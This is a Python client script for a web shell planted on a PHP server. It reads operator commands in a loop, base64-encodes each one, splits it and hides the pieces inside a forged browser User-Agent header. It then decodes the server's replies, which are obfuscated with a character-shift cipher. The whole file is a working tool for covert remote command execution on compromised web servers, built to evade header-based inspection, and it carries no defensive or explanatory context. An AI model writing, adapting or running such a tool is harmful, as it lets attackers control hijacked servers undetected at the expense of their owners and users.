#!/usr/bin/python
# -*- coding: UTF-8 -*-

import requests
import base64
str_1 = ""
str_2 = ""
def divide(str3):
    num = int(len(str3)/2)
    num_1 = int(len(str3))
    str1 = str3[0:num]
    str2 = str3[num:num_1]
    return (str1,str2)

headers = {
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate"
    }
user_agent_1 = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_ Version/5.1 Safari/534.50"
user_agent_2 = "6_8; en-us) AppleWebKit/53"
user_agent_3 = "4.50 (KHTML, like Gecko)"
headers['User-Agent']=user_agent_1+str_1+user_agent_2+str_2+user_agent_3

def xxx(string_1):
    xxx_ls = ""
    for i in string_1:
        xxx_ls = xxx_ls + chr(ord(i)-1)
    return (xxx_ls)
print("example:http://127.0.0.1/1.php")
url = input("请输入")
while True:
    str_3 = input("please input cmd:")
    str_3 = bytes(str_3, encoding="gbk")
    str_3 = base64.b64encode(str_3)
    str_1, str_2 = divide(str_3)
    str_1 = str(str_1, encoding="gbk")
    str_2 = str(str_2, encoding="gbk")
    headers['User-Agent']=user_agent_1+str_1+user_agent_2+str_2+user_agent_3
    ls = requests.get(url=url,headers=headers)
    ls_1 = str(ls.content,encoding="utf-8")
    ls_1 = xxx(ls_1)
    ls_1 = bytes(ls_1, encoding="gbk")
    ls_1 = base64.b64decode(ls_1)
    ls_2 = str (ls_1, encoding="gbk")
    print (ls_2)

